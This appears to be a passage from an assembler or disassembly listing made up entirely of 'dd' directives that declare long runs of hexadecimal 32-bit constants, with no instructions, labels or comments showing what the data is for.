		dd 0BF4AE2A7h, 38B998EAh, 437583BDh, 6F309016h,	6A47C53Eh
		dd 0C59982EDh, 0A1129D8Ah, 4DFE2A7Bh, 538738h, 0C79B3FE7h
		dd 9CF99300h, 0C37F1BEh, 1D44030h, 6D823E7Fh, 766E5D09h
		dd 0BC6527DEh, 0D3792119h, 1B0BCCB1h, 0D67F3068h, 4BC05AD4h
		dd 0CA714168h, 220095CBh, 3C1E0190h, 5B11D3C1h,	5E71B81Fh
		dd 0AD138844h, 6E56E71Fh, 0F57658BAh, 9648AAC4h, 248F2CA7h
		dd 5531714h, 0D19476C0h, 0AFF97E95h, 912EA4D0h,	2F4A4E9Bh
		dd 0BDD143FCh, 0D9B7B746h, 22D59429h, 540B50ECh, 72DB3D3Bh
		dd 77B402E8h, 84158D28h, 0FE6CC5BCh, 0B5DD9BEEh, 566866D8h
		dd 479582F2h, 0DD528F90h, 68193C9Bh, 3EBBA4E8h,	92CB8FEh
		dd 0D26CC3BFh, 75DBDEAAh, 0FC07DA02h, 0EA535D9Bh, 0B1437921h
		dd 0A62403E7h, 0F7CCA5B2h, 540DE2F3h, 0CF1E323Bh, 0C9996D65h
		dd 43ECC959h, 7D4000B7h, 0F69C05A1h, 0C2E0D33Ah, 0EE866967h
		dd 0DF017E31h, 0ACA6EEAh, 0DD180DDBh, 7A9A8C22h, 0CD30839Ah
		dd 0D79369DAh, 0D2C30E56h, 617C3ACBh, 70CADD9Dh, 260447D3h
		dd 8590B3B1h, 0C8970F05h, 0B85160B9h, 56F9D573h, 7499B98Eh
		dd 5EC0D07Ah, 0D6FE4B00h, 95C3AF8Ah, 0E579CCA3h, 0F386A4DAh
		dd 0D6DE86C5h, 0EF6BA4CDh, 83B71B80h, 0D91A922Eh, 0CF0D32E7h
		dd 0D562D0FFh, 7F59190Fh, 0CA4FA90Eh, 0E2CE1BE8h, 98513111h
		dd 0EACC493h, 0C34213A1h, 0D4597907h, 0EA38BF10h, 854B5F13h
		dd 0CF5EF68Fh, 6552592h, 81E13C57h, 7517A0C4h, 2E3D0580h
		dd 0B46AC7FEh, 78E85AFDh, 941D8F8Ah, 38A255F1h,	0C858C558h
		dd 2D3B6208h, 111789B3h, 0F4C30B23h, 3F2830EBh,	0F16F60E7h
		dd 0B13CDC43h, 0A0E8DA9Ch, 0B2E2EDC0h, 234374BDh, 69EC01C0h
		dd 0FBC2EAD0h, 94B0F580h, 0BC4D8BCEh, 0E514C094h, 7DE03EBFh
		dd 39A73AE3h, 0D0177981h, 2DD851BDh, 32A4FD42h,	9B5B753Ah
		dd 0F5456B5Dh, 0FFD671D8h, 35D4B32Dh, 0D9059F67h, 2802C833h
		dd 6464D54h, 0B991DCDCh, 8EAFDAA4h, 5D2C28C3h, 6E502487h
		dd 0F6508B90h, 9AEE7E82h, 0B8A7391Eh, 559B8E72h, 0D55D9895h
		dd 93C5FDB5h, 2D24D477h, 1E1997ADh, 17ACFAFh, 41D908B3h
		dd 89EBB86Ch, 0DF27A57h, 4637465Bh, 4F4024F2h, 794D9552h
		dd 0F1202D94h, 5BC9D1A2h, 4DF4DF91h, 72364B52h,	8E6F3411h
		dd 0C732393Eh, 2ED72A2Fh, 2B8FE0Eh, 0E744E836h,	7F248235h
		dd 0BBDEBA53h, 0DDD5390h, 0EC7FB7F4h, 3B51CB13h, 27035AE8h
		dd 95C49DCBh, 0B110EF65h, 43934062h, 28A37AC2h,	72A380A4h
		dd 139CA58Ah, 0B64E568Bh, 0D0A45645h, 79FE67E1h, 85212954h
		dd 991DB65Bh, 41920FCEh, 98151543h, 0AFB75318h,	0BBC6DEC5h
		dd 2917DF31h, 398A8FDFh, 58F38013h, 25780BC7h, 52113649h
		dd 0B0040E33h, 0D67F5E78h, 8A950459h, 0B7FB8EA0h, 6EF1F671h
		dd 75F1C47h, 0D7C8498Ah, 2C1973Eh, 92D56AA5h, 0D58E1B22h
		dd 0D386D7AAh, 7698C215h, 55859F91h, 0DB232F87h, 7ABE2CCFh
		dd 51962D5h, 2E51DBA1h,	7359D534h, 33AE7292h, 7FF86822h
		dd 0E47EF9ABh, 7894B250h, 0B634B8DBh, 10500D1Ch, 14E12678h
		dd 3F70612Fh, 485039D6h, 87AEE697h, 3630680Eh, 0D37AD63Dh
		dd 8227570Bh, 196640E7h, 6F411E45h, 0E99BCDF4h,	789AC4D3h
		dd 1512F99Eh, 0EC2DCCD4h, 0CBDFE03Ch, 5E295CECh, 0FA4D5ABAh
		dd 9CF700CAh, 5D068AC6h, 0D7FCA5B5h, 54063FEFh,	0BE071C29h
		dd 0BB0C3A6Fh, 34CDD811h, 3AFD749h, 9A311DA1h, 0A756C404h
		dd 0FAF25193h, 5167D922h, 892D9D00h, 0E2EF8265h, 62F4DADh
		dd 938F48F7h, 0C5A3AB66h, 0D9F1209Dh, 4B804E5h,	5846E09Dh
		dd 0DF8E253Bh, 0A5758449h, 0A6C595F5h, 0AE8833F5h, 0DFEE3EEAh
		dd 0AABF269Fh, 0F2B3B61Ah, 0DDFD77BEh, 1BE4271Ah, 1410D7F0h
		dd 5A9F693Fh, 20697224h, 0C1ECD50h, 56E740C4h, 0FC28F27h
		dd 7CDA6180h, 0CD6BC996h, 58648E90h, 1DE5C8C1h,	0AC976DFEh
		dd 6BC2ACFFh, 0CCCFE874h, 0A0C24C95h, 0A4788E8h, 0F5E415DCh
		dd 47BD5117h, 0D5FD67C7h, 29F5F5CEh, 574E5CA1h,	9EA35255h
		dd 19244936h, 0CDCB3D39h, 13334320h, 430B20BEh,	13CBD635h
		dd 0F7113069h, 2AA45F0Bh, 0FBF7E807h, 5E07E487h, 0C6D78961h
		dd 0EAC84C3Dh, 962D472Bh, 32C2D19Dh, 3D72D821h,	0A2A7952Bh
		dd 0CE9EAF95h, 0BBFDA68h, 9AC8CB8Dh, 1BE3764Ah,	0C8FB17EEh
		dd 0B44A28FEh, 19F4D21Dh, 0D546DDCAh, 0CA09192Ah, 0EC39F8DCh
		dd 9D96A181h, 619F8EBFh, 5FD7A8D0h, 0CDBF4FC7h,	18CCD28Eh
		dd 7FD35598h, 3E1A56ADh, 52FDC302h, 0E46E0C0Ah,	0B24BC3B2h
		dd 43FE308Bh, 0F557205Ch, 0D3EFE525h, 0E07E54FBh, 0F2008E22h
		dd 0C7F8133h, 9BB17FE3h, 8FE76D8Bh, 1F02AD8Ah, 95FE3994h
		dd 4D1C5D68h, 90D47DC7h, 7905F494h, 91D63854h, 0DD0A267Dh
		dd 0CBF64426h, 0FEF009DAh, 9DC70D2Ch, 0F12BFA64h, 0FDB51B67h
		dd 0C72492FFh, 9F12F324h, 0EA542AB8h, 898B1615h, 0E086C598h
		dd 0EC3B6D6Eh, 36C706C1h, 0B1E6A59Bh, 1B4F1D4Dh, 0E6EC6B1Eh
		dd 640BECFEh, 0EEA688F4h, 6EFC0BF9h, 9F10B094h,	5FD20518h
		dd 377BA456h, 9ACC8D8Dh, 12892433h, 13530A1Eh, 0B38C7113h
		dd 44B2A112h, 7B8817A6h, 0A843998Eh, 7917E27Bh,	83FF6533h
		dd 0D890AFC4h, 0C7EDEA26h, 0E7893BB9h, 0AD7D9DDEh, 58900B8Eh
		dd 1607F7B8h, 11817260h, 621B4224h, 14295F57h, 76909DD5h
		dd 0E51A9B72h, 797322F2h, 9E9FE8ABh, 6524B21h, 1A3AF568h
		dd 3D346CD5h, 7264800Eh, 7018E968h, 12E9BAA7h, 33EE301Ah
		dd 6994A788h, 0C80C6E3Ah, 0DC8D5B40h, 0D72BC7F6h, 8F33A937h
		dd 4338C1FCh, 21C1540Ch, 0C26972D4h, 0D4D72A81h, 36155058h
		dd 7F171F6Ah, 7ACB3B1Fh, 53524270h, 0A4C42390h,	57017D63h
		dd 0F9F5D8DFh, 76734BC7h, 15074BECh, 1200FB9Ch,	0AE7CAC86h
		dd 0AE49294Ch, 0EA90CE32h, 337AF1F7h, 0F18501A7h, 0A12CC2FAh
		dd 588641A9h, 0EEBBEED1h
		dd 0A1EB56E1h, 0B519A2Eh, 362E9A54h, 0F7574B9h,	139DBCC5h
		dd 0B625C1ACh, 8FD91319h, 0AD98B832h, 34CCFBA2h, 8F1979C1h
		dd 1FFCFAA9h, 1F810D4Dh, 341BE83h, 502B0C8Ch, 0CEEFAB74h
		dd 0FAD09408h, 0B35784ADh, 0AF06BE3Ch, 0AC50AA00h, 6DD999EAh
		dd 496E5733h, 0D52CCFCAh, 79DA6ED8h, 0CCEED648h, 0B5E4D1Dh
		dd 0F73369D7h, 0FE364F78h, 0E4EF2C01h, 0DC00E19Bh, 2C5D1FD4h
		dd 0CD0DAE09h, 0EF579884h, 98F28B21h, 0C36B4B4Dh, 21DDD72h
		dd 0D10C92DAh, 8DD7D6AEh, 0D4F5DD08h, 38D161A1h, 0B8DDE8B2h
		dd 0A1AE23A8h, 9FBAC31Fh, 0FCA588EFh, 5253F5E8h, 27392E11h
		dd 1F306C5Fh, 9A8F3693h, 0F31E70CFh, 96A07CF3h,	9718EFB8h
		dd 24FB00A4h, 9ED64EDDh, 0EC491B65h, 97013054h,	8147F03Fh
		dd 0F08E52BAh, 78F7F734h, 8893D510h, 33567144h,	0C44B1087h
		dd 2C10643Fh, 59FA598Eh, 0C6D3C242h, 0ABE93FE9h, 0EB991547h
		dd 7871A250h, 0FE6A80D4h, 1042ACB5h, 599FFDCAh,	2D14401Ch
		dd 0EF050496h, 10C4B6E8h, 0BEC3E892h, 0C5664CB9h, 0AEA706CEh
		dd 99C8B4D4h, 1BAA1BE3h, 0E2C6BA76h, 52EDA3D2h,	0F1361AEAh
		dd 0B3817F2Ch, 0E70EE872h, 0B07F0D58h, 3751D7F4h, 9F9B1EC5h
		dd 6C2A4314h, 48550DA8h, 572DFB1Dh, 41C72AA0h, 9850B132h
		dd 318D81F4h, 78F29A33h, 0FED20E85h, 186FACC9h,	574C7EE0h
		dd 0E0D8C28Eh, 7D758EBh, 0EC068911h, 5048B077h,	0E9422A0Ah
		dd 40B63DEBh, 3FC1219Eh, 4E45F07Ch, 0DD10CFEDh,	3EC7B065h
		dd 0E27AB351h, 0B8CDF571h, 0B51987BDh, 20A695A2h, 372BA4D3h
		dd 0A8C613AFh, 3277BC5h, 0A967C046h, 8E2481C3h,	7431C405h
		dd 0F6D1CDF7h, 0B46CF74Ch, 0CBEBC1D3h, 0B72A3A9Dh, 84389EE0h
		dd 400CC0FEh, 2042FC74h, 874D03F0h, 36C1750Ah, 8FDE6A24h
		dd 0CDCABC4Ch, 0ED54214Eh, 355ADC05h, 0C0602E6Bh, 0AF17987h
		dd 0C4660024h, 0B2D47E0Dh, 0BB9E2243h, 5C861259h, 0B05FB08Eh
		dd 68054BB4h, 0ED9D08A3h, 0C7682769h, 0C64028Fh, 0CCCAB172h
		dd 67AA5999h, 3DC350Eh,	5E1CFD26h, 2924255Fh, 95F314DCh
		dd 936DEA1Fh, 0F5326B0Ch, 1E80379Ah, 711169A7h,	10ED07DBh
		dd 0A417C1FBh, 5EEC5141h, 28AFD31Bh, 0A3B7407h,	0E23D015h
		dd 686E992Fh, 7C767D6Bh, 6DD92C91h, 2DEE459Fh, 0D3A98DE4h
		dd 1E650B7Fh, 0F764162Ch, 64A769D0h, 0EA78C7DAh, 0FAAB66F5h
		dd 0D1CB89DBh, 50AADEE3h, 0D3E25703h, 7A75C89Fh, 0CEA3267Eh
		dd 8A9D4C84h, 0F0D44FBEh, 53C797D3h, 6C872496h,	5A9F2D70h
		dd 595A6CF1h, 3789C20h,	720D934h, 0C5837948h, 0D0B1B110h
		dd 48EEA15Ch, 80E71B2Eh, 0E09F951Ah, 2F345AA6h,	0F98CE5Fh
		dd 36C485B9h, 8E2CAFB6h, 0C176EE36h, 0C6FAD7FEh, 64350FB9h
		dd 86B521EAh, 0CD4FBE08h, 88B5C881h, 46E606Ah, 340BE98Eh
		dd 4E63ED81h, 5328A1E1h, 6FFA11C8h, 0E0B4F061h,	348330DEh
		dd 0FB33B4F4h, 2AB4AD19h, 6AEF7565h, 0F7CE37BAh, 2FF32029h
		dd 134A5A9Ah, 2A45511Fh, 3D33402Eh, 63A2F083h, 0AED6559Ch
		dd 622907FCh, 67AC4747h, 0E721F243h, 618592E4h,	9774A773h
		dd 164D6300h, 0E2563070h, 46E689F7h, 0DD9C39F8h, 867D2401h
		dd 0DAA54C40h, 0DF3E998Dh, 8623DE1h, 6A2B2559h,	8825A6Eh
		dd 903F96A1h, 7322DA1Ch, 1EEE636Fh, 1020079Dh, 10B2D700h
		dd 836425F6h, 0BF6065B0h, 0B2E7C27Fh, 6640ABF8h, 1FC4CBF9h
		dd 0E6FD0C61h, 72BBF14Eh, 44B00779h, 5F84CFD4h,	7E851836h
		dd 80989F9Ch, 3B89D60Ah, 0D6CB2248h, 7D9EE321h,	48C98A6Ah
		dd 67494528h, 9074A2D2h, 78FC0A1Ch, 160B22BEh, 6B54C66Bh
		dd 4D6FDE96h, 0B7EB3A87h, 68E6A069h, 7DE4BEB9h,	877ABF76h
		dd 0B02B8147h, 78F05564h, 0E020D5F4h, 0E2720E73h, 0F2FA44F8h
		dd 0DAB0CA91h, 440D5109h, 24FCB20Dh, 0F6F96EE6h, 1A155C7Fh
		dd 0EA569583h, 1C6718E4h, 0E4F7CAA2h, 33CA03CDh, 0CE1BE2F3h
		dd 3E96A4F0h, 16C6434Fh, 61A5B4Bh, 331B9A23h, 7C488579h
		dd 0EE539C89h, 1D5F3AAh, 0C3D34161h, 0CB17F431h, 0B6B71885h
		dd 0BAACC239h, 632B28F0h, 47CC537h, 89EEA9C3h, 0BCC49516h
		dd 64D64960h, 294EA3Eh,	0EFDEAF24h, 0B621FAC3h,	677DCAE2h
		dd 6D1F7DA4h, 694236A9h, 0B06F2985h, 0A762C5FFh, 1C124405h
		dd 11FEE269h, 637C26F4h, 0C66BE0A4h, 0A96000DBh, 3E4A5792h
		dd 0FAE685D3h, 55CAB847h, 0DCE45CE9h, 0F3FB64B6h, 0DCD4B9E0h
		dd 0FD0F6487h, 3D3B05E2h, 0E7BD711Ah, 7521094Eh, 72F7DC9h
		dd 23176680h, 3BCA28A1h, 0D2171479h, 7FA8DAD3h,	5BF80781h
		dd 6ED7D2F6h, 0CDC1E3AAh, 0A261FE68h, 2A332288h, 0B27F1F07h
		dd 8F71D025h, 0B35747C9h, 0E1A364B6h, 1C7563E6h, 0F555FE6Eh
		dd 7448106Bh, 0E5D0EB58h, 770D99CDh, 5AA9395h, 20EE4FCBh
		dd 0EDB749F4h, 38D5E4C7h, 971CBB1Ah, 0B6FB047Ch, 5E068F7Ah
		dd 18136D6Bh, 0D3107FECh, 44C70B4Bh, 4DDAF9D6h,	9B3B4685h
		dd 0EC7CF92h, 8A753B3Dh, 0A7843813h, 5FC278F4h,	59D3E0B6h
		dd 0FA32085Ah, 56039259h, 4996C7F5h, 0F47B5FBEh, 3C7CF8B9h
		dd 0B3A4D46Bh, 29C87330h, 0E9BFAAC1h, 3A3B80DBh, 5F28CC99h
		dd 0AFD5A065h, 0FC2CE971h, 0BB9A0D42h, 0A893A819h, 0D26619BFh
		dd 2457C966h, 0D48BC214h, 22693CAEh, 18836201h,	0A671FA1Ah
		dd 0E733AC6Ah, 0C0EF283Eh, 0E29949ACh, 0BDE5F2F1h, 81F0E24Ch
		dd 7CE33F47h, 8A69B203h, 3BC1AE08h, 9F5E9B3Ch, 0C4DB750h
		dd 46D24A42h, 32345DABh, 9B423FDDh, 0D7440BE9h,	0BED0654Ch
		dd 59BF6A0Eh, 542705FFh, 3A98683Bh, 0A5F469Fh, 42E0CB09h
		dd 5568A2F2h, 0AAF87D7Bh, 0EF4D6841h, 30202E59h, 0FEE2CC48h
		dd 97A7BD62h, 11B9E73Ah, 0D7558043h, 83487D3Fh,	2E8D2B61h
		dd 1F5259BBh, 0AA495DB5h, 7680627h, 1B136F10h, 3B316C3Fh
		dd 543BE3A2h, 8CB9AB94h, 3B234914h, 0CC57CE92h,	0AF790577h
		dd 0F0BCEE6Eh, 727B6A5Dh, 1176FC62h, 0DF03732Ch, 6B64A6A5h
		dd 0B233ADF9h, 9EE26301h, 0D968969Dh, 8CAA5521h, 1C13A524h
		dd 9E9217D1h, 485C4043h, 23D4DAD5h, 0A9C2CEF0h,	0E7DDDED0h
		dd 0D4E73329h, 225AEEA2h, 2BD92B1Eh, 4D192Dh, 0D7578E93h
		dd 0D0D1939h, 12E24AF2h, 0AFC07BBh, 0D6BB260Ch,	62D3B4ADh
		dd 9707B509h, 59D23984h, 687B5E69h, 5CAA8751h, 68EEF573h
		dd 1EC32479h, 0C5450B8Dh, 993679BCh, 76B48228h,	0A35F3F0Bh
		dd 0F19474FAh, 0BE75D556h, 6D879C22h, 0BE5C718Dh, 533FE143h
		dd 0D023C30Fh, 0F4036040h, 0B695F317h, 39CD3138h, 0C1F4F7A0h
		dd 532FA79Bh, 6E3CA768h, 2C857FE1h, 84573A37h, 378ECEF0h
		dd 89A3B2ECh, 0E3EAA624h, 0C0E5D01h, 9A36AF5h, 0D6BFF795h
		dd 24039121h, 0E40A5DB0h, 9292D850h, 5A95A1A4h,	0CD483228h
		dd 4259AC96h, 0DB2CB884h, 32AF1388h, 9FD9C3E1h,	7228D050h
		dd 8FD41F89h, 184D7FBAh, 8CDAFA49h, 4E841ED2h, 0AAA763B4h
		dd 5D234F05h, 0BAC3819Bh, 6A99C60h, 0A83252BCh,	0A4B44EC5h
		dd 41E7EFF2h, 4F33DAE8h, 0DE4033EDh, 0A605AC3Fh, 916A9BBDh
		dd 0BB2DF558h, 0D93D87C5h, 38CE1A39h, 0B5F3BB21h, 0FA297C03h
		dd 0AD2CCF2Fh, 5CB914FAh, 0F41EE9D7h, 24D85916h, 0B821712Ch
		dd 0DE78C0C3h, 0AE397CBAh, 8DA0F01Ah, 6993F12h,	0DFBC17D2h
		dd 0C1B099B3h, 3CB5EA4Fh, 0C079FF54h, 5BADBA10h, 131737D2h
		dd 9500625Eh, 55EFED7Fh, 0A87765B4h, 24255AE6h,	71B42071h
		dd 0E331897Ah, 0F25CF7F6h
		dd 0F32C1508h, 46828216h, 0D7FC683Ah, 0FB9378F1h, 0DA954145h
		dd 186C5247h, 899B20C6h, 9B58D167h, 20C47C4Ah, 2E5D6D5Bh
		dd 0AB127809h, 78AC7C1Ch, 10B2912Eh, 3A6244BFh,	0B01E42C8h
		dd 2A807D72h, 0F560959Eh, 76214BAEh, 7618D324h,	2556DD5Ch
		dd 2C3209FBh, 95AE9075h, 1877B95Bh, 0B1EFC698h,	36B2A7F3h
		dd 8902EBCAh, 0A9D0A7DAh, 6DA65DAAh, 176352CBh,	0C9FE863Dh
		dd 10E0EE35h, 99521FE5h, 0D767A5C7h, 0F615D2B4h, 438322D3h
		dd 0BC4C641h, 5AE5B29Ah, 88693D40h, 4C2F5A0h, 0F41F5BC3h
		dd 0E03C14D9h, 914F47F0h, 3EE09504h, 0EAA866FEh, 237BB855h
		dd 1452ED36h, 0C3347000h, 6D7DFF8Eh, 30B40B05h,	0FC20003Fh
		dd 0E98017D2h, 0C62DEC1Dh, 17BE39F5h, 0F3AF4B66h, 0FB9DA2E7h
		dd 0EE3546AFh, 0F02A3808h, 0BAE082D2h, 0B66F199Ch, 0F34556E8h
		dd 0A7D1D79Ch, 9B934C09h, 0F17B2876h, 3BAB074Fh, 0B82E701Eh
		dd 1A8FEAD4h, 0EA672ED2h, 186E8C30h, 0B666B3F0h, 0A46B697Dh
		dd 60696619h, 4C39377h,	1A225A16h, 8E7F37A5h, 1CD6048h
		dd 0D827BF8Dh, 0AFF0EB53h, 534DE547h, 0CA8AC65Fh, 0AE8DD2F1h
		dd 0A307450Dh, 0A9F4A96Ch, 0B5692917h, 0A209FE65h, 420B5E6Eh
		dd 213776F1h, 361B2824h, 0A68C7E70h, 79344818h,	81A3F2E6h
		dd 339CEB38h, 3EAF85C5h, 65DCCFE8h, 0C0987A32h,	8D3B5AB9h
		dd 2C0C69B4h, 65CFE0Fh,	0D3724680h, 0F91C772Bh,	407C4DD0h
		dd 730594ACh, 0E211474h, 5C3EF346h, 0A493CFBDh,	0D7DCF568h
		dd 985B7B79h, 3CFD6714h, 0E6779B70h, 953EDA8Dh,	926BF122h
		dd 3BD5D32Bh, 49FDBAA5h, 0B5EB73F2h, 0CB5B542h,	641DB2D0h
		dd 0B3351EFBh, 94632575h, 4EEFE266h, 6A5CEC41h,	0C96F28FBh
		dd 86C41E26h, 0C69F59BFh, 4D3537EDh, 12C97601h,	0EEE378D3h
		dd 98C160C9h, 927E837Dh, 46E94CABh, 1880DF7h, 64EAF089h
		dd 0FDA6591Ah, 2C2D8AC8h, 0A0153699h, 7AAD64DDh, 0AB305EC6h
		dd 0B9C485E7h, 0D2C970B7h, 0E011700Bh, 8E660818h, 8B1638Bh
		dd 5D25E6FEh, 0DE999CEDh, 701510D3h, 0FB9B42ABh, 0BE75BD1Ah
		dd 0EBF4ED39h, 0FBC072D8h, 725DAECDh, 0E8224E24h, 21FF6039h
		dd 9EBBC1B6h, 6F7A6FB3h, 4BDF3520h, 1B3DC686h, 56C26A53h
		dd 0A8EC5F6Ah, 0DB310138h, 268B1921h, 0B0A97292h, 0F282C48Dh
		dd 2F8A0E3Eh, 6127639Eh, 0C0970FF5h, 45A86D2Ch,	0E2F96A9h
		dd 1F967182h, 4038E0FDh, 766A29EEh, 6DB49982h, 72C11558h
		dd 0BA8B42E3h, 0C35A1DD5h, 78ED23A7h, 0AB9CA46Ch, 747CD80Dh
		dd 78542AEEh, 0A203CB14h, 4881B5BAh, 620F4BB5h,	799959B6h
		dd 0FBEAD361h, 0C43B9415h, 419DF6F7h, 6655150Fh, 85E7F2D1h
		dd 0A76AA4C2h, 1F3084B6h, 0BCAF1DD6h, 0F0DC5B32h, 5E37EEDCh
		dd 0BE11428Bh, 0ED544E7Bh, 3E0F76D8h, 0BA19B303h, 59F178F4h
		dd 931D9920h, 0D457D267h, 63E108A3h, 460D0D1Fh,	0D2E90DA2h
		dd 0E126F921h, 0E9516406h, 0A3216188h, 123AB637h, 0E883552Ah
		dd 6DF1EECh, 73EB08A6h,	0ACCC2722h, 20DA4F60h, 748D597Bh
		dd 0CBDF7F03h, 8DFBE9DFh, 0D4C6CDB3h, 49ED647Bh, 0B8C8CEE2h
		dd 9FE94A35h, 637B0513h, 9A0266D0h, 37B39839h, 36FAA834h
		dd 0C67B3CD6h, 0F5E75CCBh, 0F4427A45h, 0F161FFE4h, 90DBF181h
		dd 0BB3BF630h, 5EDC8FA1h, 0B5C9510Bh, 1429B57Eh, 5E9D0CBEh
		dd 0B2982129h, 0B8633756h, 0A069CCECh, 0C9F77FE2h, 0E69547B6h
		dd 9A2ABF24h, 6914CF99h, 2B3CC95Dh, 0D86B179h, 8357E195h
		dd 0E2FBD38Eh, 3A3F8BD7h, 0EFD61298h, 0A5C53146h, 0DEDD44BFh
		dd 0DD51B8BBh, 0AE7A0D10h, 672CCB21h, 0A2791D70h, 15F422D0h
		dd 0F5D99390h, 1CCF712Dh, 2C53907Fh, 0CED5FA09h, 6EA8787Ah
		dd 0D7E689BAh, 85B6DBAAh, 23DDD29Dh, 1FFD1EDFh,	23D5B29Fh
		dd 45966C9Bh, 0BA46C833h, 9D497D08h, 0DD90B6BCh, 2729C9E6h
		dd 0BFE464EFh, 1DF692E8h, 0A306E888h, 15C5C0DFh, 2A631165h
		dd 326DD4F6h, 3C34D648h, 10D269D8h, 694EDA72h, 6ECE2B44h
		dd 4EBC29ADh, 14E80BC0h, 759986A5h, 67453A0Ah, 78DCE831h
		dd 637958C4h, 7F94068Ah, 6617420Ch, 0CE4569A9h,	8AFF1F93h
		dd 2EE3B13Ah, 0B54F8909h, 4C657833h, 0E248C591h, 6A349166h
		dd 932DE0BDh, 6169B9FEh, 43A2C01Ch, 0E9CF1CE4h,	3F59A7BFh
		dd 9375480h, 0CE14EFB0h, 5A4ECCF7h, 6691263Eh, 0FCC3B54Ch
		dd 0D57BD1B1h, 736E4E65h, 0B60F2A17h, 3E71978Fh, 9AE6302h
		dd 0F64B877Fh, 4EA5F276h, 44770E52h, 0ECA2C682h, 5A8E0093h
		dd 927D7EB1h, 6A5E0F9Bh, 0F74FAB98h, 0FAE4EE11h, 1F9EC7AAh
		dd 0B3A5FA27h, 85B3029Bh, 0D5ED50B7h, 0F21D6C6Dh, 7ACDDF1Ch
		dd 43191379h, 9EA97D12h, 0A19E82ACh, 0E1292A91h, 4B2D096Dh
		dd 0E5F20A3Dh, 36AF5DF7h, 0FBAB6ADCh, 8D184A09h, 0A7C700ACh
		dd 0E680DFBAh, 0E5566E9Fh, 0BBAB02C4h, 34EFD856h, 47F4D00Ch
		dd 0DF661F07h, 0ED470227h, 3EBA8BDAh, 98EDA48Eh, 7C3133BAh
		dd 0CC7C2794h, 0E5304982h, 0F3849BE2h, 0FCE9C17Ch, 9AB4C7F6h
		dd 0C3DDB1B3h, 8F2E5710h, 27CA9541h, 52F2F1C3h,	9C2225ADh
		dd 449522Fh, 405119C2h,	98865559h, 0C79424C7h, 3E030C79h
		dd 434A9CD9h, 0C6F428C7h, 4603007Ch, 0B4A88BB2h, 4E628C6h
		dd 0B8E63B87h, 0A542E057h, 0FB8678E5h, 8D83DC5Dh, 82D0C534h
		dd 0E67C6EC5h, 7E61BF8h, 22B9E2C6h, 0E50802E4h,	2FE58B4Fh
		dd 223964C9h, 0FFB749DBh, 0FF16CF5h, 8BCEF1FAh,	7563D073h
		dd 507552B0h, 2E8F6FF3h, 0ED6F6431h, 5C8D3D51h,	0C06A440Eh
		dd 164B4168h, 7E2EC18Dh, 0E5A9A48h, 0D7EFE961h,	0F7100A90h
		dd 0B06DCA83h, 617AA06Ah, 0E071519Ah, 0EEFB1C0Eh, 8F27622h
		dd 0B1E79D44h, 0DBDB29Ch, 0DE505736h, 2EA5972Ah, 35550006h
		dd 0E841B42Bh, 4C609922h, 43E784C5h, 49027D22h,	6B21F487h
		dd 0EED09E86h, 31409AD7h, 42020358h, 0EFDA3EF7h, 0C6319FE9h
		dd 27B47C3Eh, 0BC03CC5Bh, 8D84FF03h, 0CA2C990Ah, 30083FE5h
		dd 99607A6Bh, 90AF410Ah, 13E36A01h, 0EB8FC350h,	4F2C4E49h
		dd 7EE73FA0h, 298907F0h, 969AC1DBh, 0D87FCA30h,	0CCB393D5h
		dd 0C92C2CEBh, 57461831h, 0B67C91FFh, 3D4EF753h, 0A18438CCh
		dd 5EBFBE66h, 0D584A566h, 0AEA45601h, 774C2574h, 67E67583h
		dd 0C58FB0E4h, 0A80DB25Ch, 2F05AFE9h, 9BC246E6h, 48C1DB8Ch
		dd 0FE972D58h, 1CB4A5EAh, 1FFE68EBh, 0B611F1B3h, 0A488AD56h
		dd 88EBD17h, 0EBE4CA8Ch, 1B97F59Dh, 0EABD99AFh,	7EC4A6AAh
		dd 200244E7h, 3B07C087h, 0AC3A269Dh, 0D42387EAh, 0BAA83453h
		dd 2B9DE16Ch, 9F20C71Dh, 2C553330h, 6D2F47A9h, 3407CCF5h
		dd 18AB3F0Ah, 0FD0852EAh, 0E14204EDh, 8E6A0C7Bh, 5258ED93h
		dd 86805F35h, 7B7F4BE1h, 92B1A8D3h, 200FAB52h, 3D8C9544h
		dd 1E6B115Eh, 0A0DCBBF9h, 55023B0Ah, 68BDCCD3h,	239CA7C1h
		dd 0DF1EDF39h, 0ED2455A2h, 47D73A9Bh, 51C43B91h, 0EE0D7AAFh
		dd 0A8938243h, 8DADE664h, 7DA9D7B6h, 0E80CC12Ch, 0D0BF764Bh
		dd 66A7E868h, 348327B1h, 70EC1D89h, 0B6C27E8Bh,	0D0293FC7h
		dd 0A781B07Bh, 4C26CBA7h, 26328991h, 0D1DB8C87h, 940653E0h
		dd 0B12872DBh, 891C70AFh, 20BE0BBBh, 0F26263D3h, 0E7A937DFh
		dd 0AA067989h, 0CAFDEF9Dh, 3B4A175Eh, 7A701050h, 41039DFDh
		dd 8E8748C2h, 9C2DEFBDh, 6F12791Fh, 97831A54h, 1F340A49h
		dd 339584DFh, 2EC684ACh, 170F36C9h, 3DC5ED15h, 0F95029BDh
		dd 0EB7E002Ah, 0B9D91A23h
		dd 0EBE9477Dh, 3B55B18Dh, 0FB8F782Eh, 86560ABFh, 7A42C46Eh
		dd 91C74FFCh, 8C00AFAFh, 2363F8C5h, 0D1BA6236h,	1BBD55FFh
		dd 6FD0F039h, 0C3E15B6Ah, 0BD8075E9h, 0B536F666h, 0B72515F3h
		dd 0E8CF9860h, 0C62040D5h, 4E04DD6Ah, 3B1A150Eh, 0E9A6EC4Bh
		dd 1EE60872h, 4D840DAAh, 379A5EB0h, 0E9EE4981h,	0E9D02CCAh
		dd 7625DEF8h, 0DF41677Bh, 0B6841A68h, 833032A6h, 5E06FCD9h
		dd 0E98A851Eh, 0F4769055h, 978726BBh, 6097AD6Fh, 0F771716Bh
		dd 84316A92h, 1FF835F0h, 8886F504h, 988A8E8Eh, 246D9FA1h
		dd 0F6BEA1E6h, 0FDC47623h, 0AEC3DD6Bh, 9BC1BCAh, 3F481AB3h
		dd 70FEF3BBh, 0DF442157h, 0B7904583h, 7F025C7Dh, 0C51AEF72h
		dd 0A1E87040h, 323532E7h, 67AFC218h, 3F2BAC61h,	4F8193B0h
		dd 398462CEh, 0C7ADE172h, 0B0448C82h, 9CAF1CB3h, 0FD709481h
		dd 55D116B7h, 959CF969h, 0C39B9D41h, 34253427h,	70BC5E83h
		dd 9E661ED8h, 54D199A2h, 0E99FF0A4h, 0BF02FCA5h, 6A30DACEh
		dd 775F6700h, 0D794ECC5h, 343B269Bh, 0B5FDCB5Fh, 84EB9065h
		dd 9D43B8Ah, 0E37599CFh, 0F9D2C2E4h, 0C683BD82h, 0BA3DB1A5h
